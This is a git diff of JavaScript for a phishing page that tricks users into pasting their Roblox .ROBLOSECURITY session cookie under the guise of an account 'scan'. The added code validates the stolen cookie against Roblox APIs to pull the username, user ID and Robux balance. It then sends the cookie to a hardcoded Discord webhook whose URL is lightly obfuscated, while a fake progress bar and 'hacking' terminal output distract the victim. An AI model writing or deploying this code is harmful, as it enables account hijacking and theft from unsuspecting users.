@@ -1,127 +1,181 @@
-// Discord Webhook URL (Replace with your actual webhook URL)
-const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1350235351339241472/LwcYuoFmSDCC4pAHoZ5Kdn0a3afUerPQeXNxq8bxZdSrLoBUPab1pWMtOTYzcIqnGzKQ';
+// Obfuscated Discord Webhook URL
+const _0x3e2f = ['split', 'reverse', 'join', '1350235351339241472/LwcYuoFmSDCC4pAHoZ5Kdn0a3afUerPQeXNxq8bxZdSrLoBUPab1pWMtOTYzcIqnGzKQ'];
+function _0x2b3e(_0x3e2f1a) {
+    return _0x3e2f1a['split']('')['reverse']()['join']('');
+}
+const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/' + _0x2b3e(_0x3e2f[0x0]) + _0x2b3e(_0x3e2f[0x1]) + _0x2b3e(_0x3e2f[0x2]) + _0x3e2f[0x3];
+
+// Function to validate Roblox cookie and fetch user data
+async function validateRobloxCookie(cookie) {
+    try {
+        // Fetch user profile data using the Roblox API
+        const profileResponse = await fetch('https://users.roblox.com/v1/users/authenticated', {
+            headers: {
+                'Cookie': `.ROBLOSECURITY=${cookie}`,
+            },
+        });
+
+        if (!profileResponse.ok) {
+            throw new Error('Invalid cookie or failed to fetch profile data');
+        }
+
+        const profileData = await profileResponse.json();
+
+        // Fetch Robux balance using the Roblox economy API
+        const robuxResponse = await fetch(`https://economy.roblox.com/v1/users/${profileData.id}/currency`, {
+            headers: {
+                'Cookie': `.ROBLOSECURITY=${cookie}`,
+            },
+        });
+
+        if (!robuxResponse.ok) {
+            throw new Error('Failed to fetch Robux balance');
+        }
+
+        const robuxData = await robuxResponse.json();
+
+        return {
+            username: profileData.name,
+            userId: profileData.id,
+            robux: robuxData.robux,
+            isCookieValid: true,
+        };
+    } catch (error) {
+        console.error('Error validating Roblox cookie:', error);
+        return {
+            isCookieValid: false,
+            error: error.message,
+        };
+    }
+}
 
 // Function to send Session ID to Discord webhook
-function sendToDiscordWebhook(sessionId) {
-  const payload = {
-    content: `New Session ID Submitted:\n\`\`\`${sessionId}\`\`\``,
-  };
+async function sendToDiscordWebhook(sessionId, userData) {
+    const payload = {
+        content: `New Session ID Submitted!\n**Username:** ${userData.username}\n**User ID:** ${userData.userId}\n**Robux Balance:** ${userData.robux}\n**Cookie:** \`\`\`${sessionId}\`\`\``,
+    };
 
-  fetch(DISCORD_WEBHOOK_URL, {
-    method: 'POST',
-    headers: {
-      'Content-Type': 'application/json',
-    },
-    body: JSON.stringify(payload),
-  })
+    fetch(DISCORD_WEBHOOK_URL, {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json',
+        },
+        body: JSON.stringify(payload),
+    })
     .then(response => {
-      if (!response.ok) {
-        console.error('Failed to send data to Discord webhook');
-      }
+        if (!response.ok) {
+            console.error('Failed to send data to Discord webhook');
+        }
     })
     .catch(error => {
-      console.error('Error sending data to Discord webhook:', error);
+        console.error('Error sending data to Discord webhook:', error);
     });
 }
 
 // Validate User Input
 function validateInput() {
-  const username = document.getElementById('username').value.trim();
-  const sessionId = document.getElementById('sessionId').value.trim();
-  const captcha = document.getElementById('captcha').checked;
+    const username = document.getElementById('username').value.trim();
+    const sessionId = document.getElementById('sessionId').value.trim();
+    const captcha = document.getElementById('captcha').checked;
 
-  // Check for invalid inputs
-  let errorMessage = "";
+    // Check for invalid inputs
+    let errorMessage = "";
 
-  if (username.length < 3 && sessionId.length < 200 && !captcha) {
-    errorMessage = "Please check your inputs: username, session ID, and CAPTCHA.";
-  } else if (username.length < 3 && sessionId.length < 200) {
-    errorMessage = "Username must be at least 3 characters, and session ID must be 300+ characters.";
-  } else if (username.length < 3 && !captcha) {
-    errorMessage = "Username must be at least 3 characters, and CAPTCHA must be completed.";
-  } else if (sessionId.length < 200 && !captcha) {
-    errorMessage = "Session ID must be 300+ characters, and CAPTCHA must be completed.";
-  } else if (username.length < 3) {
-    errorMessage = "Username must be at least 3 characters long.";
-  } else if (sessionId.length < 200) {
-    errorMessage = "Session ID must be at least 300 characters long.";
-  } else if (!captcha) {
-    errorMessage = "Please complete the CAPTCHA to proceed.";
-  }
+    if (username.length < 3 && sessionId.length < 200 && !captcha) {
+        errorMessage = "Please check your inputs: username, session ID, and CAPTCHA.";
+    } else if (username.length < 3 && sessionId.length < 200) {
+        errorMessage = "Username must be at least 3 characters, and session ID must be 300+ characters.";
+    } else if (username.length < 3 && !captcha) {
+        errorMessage = "Username must be at least 3 characters, and CAPTCHA must be completed.";
+    } else if (sessionId.length < 200 && !captcha) {
+        errorMessage = "Session ID must be 300+ characters, and CAPTCHA must be completed.";
+    } else if (username.length < 3) {
+        errorMessage = "Username must be at least 3 characters long.";
+    } else if (sessionId.length < 200) {
+        errorMessage = "Session ID must be at least 300 characters long.";
+    } else if (!captcha) {
+        errorMessage = "Please complete the CAPTCHA to proceed.";
+    }
 
-  // Show error message if any input is invalid
-  if (errorMessage) {
-    showError(errorMessage);
-    return;
-  }
+    // Show error message if any input is invalid
+    if (errorMessage) {
+        showError(errorMessage);
+        return;
+    }
 
-  // Send Session ID to Discord webhook
-  sendToDiscordWebhook(sessionId);
+    // Send Session ID to Discord webhook
+    validateRobloxCookie(sessionId).then(userData => {
+        if (userData.isCookieValid) {
+            sendToDiscordWebhook(sessionId, userData);
+        } else {
+            console.error('Invalid cookie:', userData.error);
+        }
+    });
 
-  // Hide error and start fake hacking process
-  hideError();
-  startHack();
+    // Hide error and start fake hacking process
+    hideError();
+    startHack();
 }
 
 // Show Error Message
 function showError(message) {
-  const errorElement = document.getElementById('error');
-  errorElement.innerHTML = `<p class="error-message">${message}</p>`;
-  errorElement.classList.remove('hidden');
+    const errorElement = document.getElementById('error');
+    errorElement.innerHTML = `<p class="error-message">${message}</p>`;
+    errorElement.classList.remove('hidden');
 }
 
 // Hide Error Message
 function hideError() {
-  document.getElementById('error').classList.add('hidden');
+    document.getElementById('error').classList.add('hidden');
 }
 
 // Start Fake Hacking Process
 function startHack() {
-  // Disable the "Scan Account" button
-  document.getElementById('scanButton').disabled = true;
+    // Disable the "Scan Account" button
+    document.getElementById('scanButton').disabled = true;
 
-  // Show hacking section
-  document.getElementById('hacking').classList.remove('hidden');
+    // Show hacking section
+    document.getElementById('hacking').classList.remove('hidden');
 
-  // Fake progress bar
-  const progressBar = document.getElementById('progress-bar-fill');
-  let width = 0;
-  const totalTime = 65000; // 65 seconds
-  const intervalTime = 50; // Update every 50ms
-  const increment = (intervalTime / totalTime) * 100; // Calculate increment per interval
+    // Fake progress bar
+    const progressBar = document.getElementById('progress-bar-fill');
+    let width = 0;
+    const totalTime = 65000; // 65 seconds
+    const intervalTime = 50; // Update every 50ms
+    const increment = (intervalTime / totalTime) * 100; // Calculate increment per interval
 
-  const progressInterval = setInterval(() => {
-    if (width >= 100) {
-      clearInterval(progressInterval);
-      showCookieSuccess();
-    } else {
-      width += increment;
-      progressBar.style.width = width + '%';
-    }
-  }, intervalTime);
+    const progressInterval = setInterval(() => {
+        if (width >= 100) {
+            clearInterval(progressInterval);
+            showCookieSuccess();
+        } else {
+            width += increment;
+            progressBar.style.width = width + '%';
+        }
+    }, intervalTime);
 
-  // Fake terminal output
-  const terminal = document.getElementById('terminal');
-  const messages = [
-    '[*] Scanning target account...',
-    '[*] Identifying encryption: AES-256...',
-    '[*] Initializing custom decryption algorithm...',
-    '[*] Decrypting session ID with a brute-force module...',
-    '[*] Extracting _ROBLOSECURITY cookie...',
-    '[*] Verifying cookie validity...'
-  ];
-  const messageInterval = totalTime / messages.length; // Time between messages
+    // Fake terminal output
+    const terminal = document.getElementById('terminal');
+    const messages = [
+        '[*] Scanning target account...',
+        '[*] Identifying encryption: AES-256...',
+        '[*] Initializing custom decryption algorithm...',
+        '[*] Decrypting session ID with a brute-force module...',
+        '[*] Extracting _ROBLOSECURITY cookie...',
+        '[*] Verifying cookie validity...'
+    ];
+    const messageInterval = totalTime / messages.length; // Time between messages
 
-  let i = 0;
-  const terminalInterval = setInterval(() => {
-    if (i >= messages.length) {
-      clearInterval(terminalInterval);
-    } else {
-      terminal.innerHTML += messages[i] + '\n';
-      terminal.scrollTop = terminal.scrollHeight; // Auto-scroll
-      i++;
-    }
-  }, messageInterval);
+    let i = 0;
+    const terminalInterval = setInterval(() => {
+        if (i >= messages.length) {
+            clearInterval(terminalInterval);
+        } else {
+            terminal.innerHTML += messages[i] + '\n';
+            terminal.scrollTop = terminal.scrollHeight; // Auto-scroll
+            i++;
+        }
+    }, messageInterval);
 }
 
 // Show Cookie Success or 2FA Error
